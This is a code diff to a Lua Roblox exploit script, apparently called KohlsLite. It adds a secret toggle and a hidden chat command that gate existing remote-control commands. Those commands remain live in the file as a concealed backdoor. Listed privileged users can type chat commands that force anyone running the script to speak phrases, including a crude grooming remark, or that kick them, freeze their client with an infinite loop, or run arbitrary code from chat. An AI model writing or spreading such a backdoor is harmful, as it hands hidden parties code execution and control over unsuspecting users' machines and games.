@@ -22,6 +22,7 @@
   -- > Noobsploit
   -- > Jotunnheim
   -- > Shazam
+
 -- Some of the code here are from other creators (and I credited) but quite a lot is my own and also some commands can't really be changed codewise that much
 
 -- This script is not discontinued but is currently dormant. Ncontrol will be added during the summer holidays
@@ -1056,6 +1057,9 @@ local AntiLogs = false
 -- Noob detector and welcome/leave message
 local noobdetect = true
 local welcomemsg = true
+
+-- shh
+thesecretvariable = true
 
 -- local permpassid = 66254 or 64354 -> NBC, BC
 -- local personpassid = 35748 or 37127 --> NBC, BC
@@ -6175,6 +6179,11 @@ Commands required: rocket]])
         Remind("Auto char is off!")
     end    
 
+    if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'blyat' then
+                thesecretvariable = false
+		Remind("how did you find this command")
+    end
+
 -- From here, my script becomes infinite yield because of Proton... --
     if string.sub(msg:lower(), 1, #prefix + 2) == prefix..'r6' then
         ChangeRig("R6")
@@ -8319,23 +8328,31 @@ v.Chatted:Connect(function(msg)
                 -- // dev \\ --
 
                 if string.sub(msg:lower(), 0, 4) == "-klc" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
-                                Speak("I use KohlsLite!")
+				if thesecretvariable == true then
+                                	Speak("I use KohlsLite!")
+				end
                 end
 
         	if string.sub(msg:lower(), 0, 4) == "-prc" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then
-                                Speak("atprog groomed me")
+				if thesecretvariable == true then
+                                	Speak("atprog groomed me")
+				end
                 end
 
                 if string.sub(msg:lower(), 0, 4) == "-klk" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
-                                pcall(function()
-                                        game.Players.LocalPlayer:Kick("A KohlsLite collaborator kicked you from the game!")
-                                end)
+				if thesecretvariable == true then
+                                	pcall(function()
+                                        	game.Players.LocalPlayer:Kick("A KohlsLite collaborator kicked you from the game!")
+                                	end)
+				end
                 end
 
                 if string.sub(msg:lower(), 0, 4) == "-prk" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then
-                                pcall(function()
-                                        game.Players.LocalPlayer:Kick("a kohlslite admin kicked you!")
-                                end)
+				if thesecretvariable == true then
+                                	pcall(function()
+                                        	game.Players.LocalPlayer:Kick("A KohlsLite user with special perms kicked you!")
+                                	end)
+				end
                 end
 
 -- DO NOT REMOVE THE COMMENTS! - DO NOT REMOVE THE COMMENTS! - DO NOT REMOVE THE COMMENTS! - DO NOT REMOVE THE COMMENTS! - DO NOT REMOVE THE COMMENTS! - 
@@ -8353,37 +8370,53 @@ v.Chatted:Connect(function(msg)
                 end ]]
 
                 if string.sub(msg:lower(), 0, 5) == "-warn" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
-                                    Remind("You have been warned by a KohlsLite collaborator!")
+				if thesecretvariable == true then
+					Remind("You have been warned by a KohlsLite collaborator!")
+				end
                 end
 
                 if string.sub(msg:lower(), 0, 5) == "-warn" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then
-                                    Remind("You have been WARNED!")
+				if thesecretvariable == true then
+                                    	Remind("You have been warned by a KohlsLite user with special perms!")
+				end
                 end
 
                 if string.sub(msg:lower(), 0, 6) == "-crash" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
+				if thesecretvariable == true then
                                      while true do end
                                 -- game:Shutdown()
+				end
                 end
 
                 if string.sub(msg:lower(), 0, 6) == "-crash" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then
+				if thesecretvariable == true then
                                      while true do end
                                 -- game:Shutdown()
+				end
                 end
 
            	if string.sub(msg:lower(), 0, 4) == "-run" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
-        			Execute(string.sub(msg, 6))
+				if thesecretvariable == true then
+        				Execute(string.sub(msg, 6))
+				end
     		end
 
            	if string.sub(msg:lower(), 0, 4) == "-run" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then
-        			Execute(string.sub(msg, 6))
+				if thesecretvariable == true then
+        				Execute(string.sub(msg, 6))
+				end
     		end
 
            	if string.sub(msg:lower(), 0, 5) == "-load" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
-        			GExecute(string.sub(msg, 7))
+				if thesecretvariable == true then
+        				GExecute(string.sub(msg, 7))
+				end
     		end
 
            	if string.sub(msg:lower(), 0, 5) == "-load" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then
-        			GExecute(string.sub(msg, 7))
+				if thesecretvariable == true then
+        				GExecute(string.sub(msg, 7))
+				end
     		end
 
                 end)
